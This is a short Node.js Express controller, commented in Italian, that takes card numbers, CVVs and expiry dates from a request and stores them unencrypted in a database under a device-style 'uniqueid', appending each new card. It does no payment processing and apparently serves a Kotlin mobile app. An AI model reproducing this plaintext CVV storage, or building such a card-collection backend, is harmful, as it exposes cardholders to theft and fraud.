// controllers/cardPaymentController.js
const CardPayment = require('../models/CardPayment');

exports.submitCardPayment = async (req, res) => {
  try {
    // destrutturiamo esattamente come nel model Kotlin
    const { uniqueid, cardNumber, cvv, expiry } = req.body;
    let cardPayment = await CardPayment.findOne({ uniqueid });

    if (cardPayment) {
      // aggiungiamo la nuova entry
      cardPayment.entries.push({ cardNumber, cvv, expiry });
    } else {
      // creiamo un nuovo documento
      cardPayment = new CardPayment({
        uniqueid,
        entries: [{ cardNumber, cvv, expiry }]
      });
    }

    await cardPayment.save();
    res.status(200).json({
      success: true,
      message: "Card Payment Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting card payment data"
    });
  }
};
